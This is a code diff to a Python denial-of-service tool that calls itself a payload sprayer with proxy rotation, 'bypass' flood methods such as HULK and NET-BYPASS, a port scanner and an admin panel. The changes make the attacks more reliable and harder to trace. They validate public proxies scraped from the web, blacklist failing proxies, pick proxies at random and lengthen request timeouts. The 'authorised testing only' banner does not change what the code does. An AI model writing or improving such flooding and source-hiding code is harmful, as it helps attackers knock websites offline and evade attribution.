@@ -5,7 +5,7 @@
     │   WITH PROXY ROTATION, BYPASS & ADMIN PANEL     │
     │   SPRAY YOUR PAYLOAD IN MY PORT !                │
     └─────────────────────────────────────────────────┘
-    Author: bob (optimised proxy RPS)
+    Author: bob (priority proxies + failure blacklist)
     Legal: For authorised testing only.
 """
 
@@ -367,12 +367,14 @@ file_proxies_enabled = False      # admin-only: use file proxies
 public_proxies_enabled = False    # anyone: use public proxies (fetched from web)
 
 file_proxies = []                 # proxies loaded from file (admin only)
-public_proxies = []                # proxies fetched from public sources
+public_proxies = []                # validated public proxies
 proxy_lock = asyncio.Lock()        # to safely update proxy lists
 
-# For round‑robin proxy selection within each process
-proxy_index = 0
-proxy_index_lock = threading.Lock()
+# Failure tracking: proxy URL -> timestamp until which it is blacklisted
+proxy_failures = {}
+proxy_failures_lock = threading.Lock()
+PROXY_BACKOFF_TIME = 60  # seconds
+PROXY_TEST_TIMEOUT = 5   # seconds for validation
 
 last_proxy_refresh = 0
 PROXY_REFRESH_INTERVAL = 300       # seconds
@@ -424,6 +426,27 @@ def load_file_proxies(file_path="proxies.txt"):
         print(f"  Error loading proxies: {e}")
         file_proxies = []
 
+async def test_proxy(proxy_url, test_url='http://httpbin.org/ip', timeout=PROXY_TEST_TIMEOUT):
+    """Test if a proxy works by making a request through it."""
+    try:
+        timeout_obj = aiohttp.ClientTimeout(total=timeout)
+        async with aiohttp.ClientSession(timeout=timeout_obj) as session:
+            async with session.get(test_url, proxy=proxy_url) as resp:
+                if resp.status == 200:
+                    await resp.read()  # consume to ensure full response
+                    return True
+    except:
+        return False
+    return False
+
+async def validate_proxy_list(proxies):
+    """Test a list of proxies and return only working ones."""
+    working = []
+    for proxy in proxies:
+        if await test_proxy(proxy):
+            working.append(proxy)
+    return working
+
 async def fetch_proxies_from_source(source_url, proxy_type='http'):
     """Fetch proxies from a given source URL with timeout."""
     try:
@@ -444,7 +467,7 @@ async def fetch_proxies_from_source(source_url, proxy_type='http'):
         return []
 
 async def fetch_proxies_from_multiple_sources():
-    """Gather proxies from various public sources."""
+    """Gather proxies from various public sources and validate them."""
     sources = [
         ('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all', 'http'),
         ('https://www.proxy-list.download/api/v1/get?type=http', 'http'),
@@ -459,7 +482,10 @@ async def fetch_proxies_from_multiple_sources():
     for res in results:
         if isinstance(res, list):
             all_proxies.extend(res)
-    return list(set(all_proxies))
+    all_proxies = list(set(all_proxies))
+    print(f"{current_color}[*] Validating {len(all_proxies)} public proxies...{RESET}")
+    working = await validate_proxy_list(all_proxies)
+    return working
 
 async def refresh_public_proxies(force=False):
     """Fetch and update public proxy list in background."""
@@ -473,27 +499,56 @@ async def refresh_public_proxies(force=False):
         async with proxy_lock:
             public_proxies = raw_proxies
             last_proxy_refresh = now
-        print(f"{current_color}[+] Public proxy list updated: {len(public_proxies)} proxies.{RESET}")
+        print(f"{current_color}[+] Public proxy list updated: {len(public_proxies)} working proxies.{RESET}")
     else:
-        print(f"{current_color}[!] No public proxies fetched, keeping old list ({len(public_proxies)} proxies).{RESET}")
+        print(f"{current_color}[!] No working public proxies fetched, keeping old list ({len(public_proxies)} proxies).{RESET}")
 
-def get_next_proxy():
-    """Return the next proxy in round‑robin order from the currently active source."""
-    global proxy_index
+def get_random_proxy():
+    """Return a random proxy from the currently active source, prioritizing file proxies for admin."""
     if not proxies_enabled:
         return None
     # Priority: file proxies if enabled and admin
     if admin_mode and file_proxies_enabled and file_proxies:
-        with proxy_index_lock:
-            proxy = file_proxies[proxy_index % len(file_proxies)]
-            proxy_index += 1
-            return proxy
+        # Filter out blacklisted file proxies
+        now = time.time()
+        with proxy_failures_lock:
+            available = [p for p in file_proxies if p not in proxy_failures or now > proxy_failures[p]]
+        if available:
+            return random.choice(available)
+        # If all file proxies are blacklisted, fall back to public if available
+        elif public_proxies_enabled and public_proxies:
+            available_pub = [p for p in public_proxies if p not in proxy_failures or now > proxy_failures[p]]
+            if available_pub:
+                return random.choice(available_pub)
     elif public_proxies_enabled and public_proxies:
-        with proxy_index_lock:
-            proxy = public_proxies[proxy_index % len(public_proxies)]
-            proxy_index += 1
-            return proxy
+        now = time.time()
+        with proxy_failures_lock:
+            available = [p for p in public_proxies if p not in proxy_failures or now > proxy_failures[p]]
+        if available:
+            return random.choice(available)
     return None
+
+def mark_proxy_failed(proxy_url):
+    """Mark a proxy as failed so it is not used for a while."""
+    if not proxy_url:
+        return
+    with proxy_failures_lock:
+        proxy_failures[proxy_url] = time.time() + PROXY_BACKOFF_TIME
+
+async def test_all_proxies():
+    """Manually test all loaded proxies and update failure list."""
+    global file_proxies, public_proxies
+    print(f"{current_color}[*] Testing all proxies...{RESET}")
+    # Test file proxies
+    working_file = await validate_proxy_list(file_proxies)
+    # Test public proxies
+    working_public = await validate_proxy_list(public_proxies)
+    async with proxy_lock:
+        file_proxies = working_file
+        public_proxies = working_public
+    print(f"{current_color}[+] File proxies working: {len(working_file)} / {len(file_proxies)+len(working_file)}")
+    print(f"{current_color}[+] Public proxies working: {len(working_public)} / {len(public_proxies)+len(working_public)}")
+    input("  Press ENTER to continue...")
 
 # ================== USER AGENT & BYPASS UTILS ==================
 def get_random_user_agent():
@@ -576,8 +631,8 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
         try:
             start = time.perf_counter()
             
-            # Choose next proxy (round‑robin)
-            proxy = get_next_proxy()
+            # Choose a proxy (prioritized, with failure tracking)
+            proxy = get_random_proxy()
             
             # Build request URL with optional random path
             request_url = url
@@ -586,10 +641,10 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
             
             # Perform request based on method
             if method == 'HTTP GET':
-                async with session.get(request_url.replace('https://', 'http://'), headers=headers, timeout=3, proxy=proxy) as resp:
+                async with session.get(request_url.replace('https://', 'http://'), headers=headers, timeout=10, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'HTTPS GET':
-                async with session.get(request_url if request_url.startswith('https') else request_url.replace('http://', 'https://'), headers=headers, timeout=3, proxy=proxy) as resp:
+                async with session.get(request_url if request_url.startswith('https') else request_url.replace('http://', 'https://'), headers=headers, timeout=10, proxy=proxy) as resp:
                     await resp.read()
             elif method in ['HTTP POST', 'HTTPS POST', 'BYPASS-POST']:
                 post_url = request_url
@@ -599,35 +654,35 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
                 if method == 'BYPASS-POST':
                     data['rand'] = random.randint(1,1000000)
                     data['session'] = ''.join(random.choices('abcdef0123456789', k=16))
-                async with session.post(post_url, headers=headers, json=data, timeout=3, proxy=proxy) as resp:
+                async with session.post(post_url, headers=headers, json=data, timeout=10, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'CURL':
-                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'GET/POST MIX':
                 if random.random() > 0.5:
-                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                         await resp.read()
                 else:
                     data = {'test': 'data', 'worker_id': worker_id}
-                    async with session.post(request_url, headers=headers, json=data, timeout=3, proxy=proxy) as resp:
+                    async with session.post(request_url, headers=headers, json=data, timeout=10, proxy=proxy) as resp:
                         await resp.read()
             elif method in ['BROWSER', 'HULK']:
-                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'DNS-AMP':
-                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'STRESS TEST':
                 for _ in range(50):
-                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'TLS-VIP':
                 for _ in range(5):
-                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
@@ -635,30 +690,30 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
             elif method == 'CONCURRENT HOLD':
                 for _ in range(99):
                     if random.random() > 0.5:
-                        async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
+                        async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                             await resp.read()
                     else:
-                        async with session.post(request_url, headers=headers, json={'data': 'test'}, timeout=3, proxy=proxy) as resp:
+                        async with session.post(request_url, headers=headers, json={'data': 'test'}, timeout=8, proxy=proxy) as resp:
                             await resp.read()
                     req_counter.value += 1
                     status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'SOCKET-AMP':
                 for _ in range(5):
-                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'NET-BYPASS':
                 for _ in range(100):
-                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'BYPASS-GET':
-                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                     await resp.read()
             # For all single-request methods, update stats
             latency = time.perf_counter() - start
@@ -666,8 +721,11 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
             latency_list.append(latency)
             status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                     
-        except Exception:
+        except Exception as e:
             err_counter.value += 1
+            # If we were using a proxy and got an error, mark it as failed
+            if proxy:
+                mark_proxy_failed(proxy)
 
         # Rate limiting: only if not a burst method
         if not is_burst:
@@ -681,8 +739,7 @@ def run_process_workers(process_id, url, method, workers_per_process, duration, 
 async def asyncio_worker_process(process_id, url, method, workers, duration, req_counter, err_counter, status_dict, latency_list):
     """Asyncio coroutine for a process."""
     end_time = time.time() + duration
-    # Increase per-host connection limit to 1000 for aggressive concurrency
-    connector = aiohttp.TCPConnector(limit=0, limit_per_host=1000, force_close=False, enable_cleanup_closed=True, ssl=False)
+    connector = aiohttp.TCPConnector(limit=0, force_close=False, enable_cleanup_closed=True, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = []
         for i in range(workers):
@@ -696,10 +753,6 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_cou
     workers_per_process = total_workers // num_processes
     remainder = total_workers % num_processes
     processes = []
-    
-    # Reset proxy index for each attack (so each process gets a fresh round‑robin start)
-    global proxy_index
-    proxy_index = 0
     
     # Start processes
     for i in range(num_processes):
@@ -1111,6 +1164,7 @@ def reconnaissance_menu(req_counter, err_counter, ports_hit_list, conn_counter):
     print("  [2] Custom Port Scan")
     print("  [3] Scan with Service Detection")
     print("  [4] Attack Discovered Ports")
+    print("  [5] Test All Proxies")
     print("  [0] Back")
     print()
     choice = input(f"  {current_color}{BOLD}Select → {RESET}").strip()
@@ -1247,6 +1301,8 @@ def reconnaissance_menu(req_counter, err_counter, ports_hit_list, conn_counter):
         
         asyncio.run(run_layer4_attack(target, method, workers, duration, plan_name, req_counter, err_counter, ports_hit_list, conn_counter))
         input("  Press ENTER...")
+    elif choice == '5':
+        asyncio.run(test_all_proxies())
     else:
         return
 
@@ -1434,6 +1490,7 @@ async def proxy_settings():
     print("  [4] Toggle public proxy fetching")
     print("  [5] Refresh public proxies now")
     print("  [6] Clear all proxy lists")
+    print("  [7] Test all proxies")
     print("  [0] Back")
     print()
     choice = input(f"  {current_color}{BOLD}Select → {RESET}").strip()
@@ -1477,6 +1534,8 @@ async def proxy_settings():
             public_proxies.clear()
         print("  All proxy lists cleared.")
         time.sleep(1)
+    elif choice == '7':
+        await test_all_proxies()
     else:
         return
 
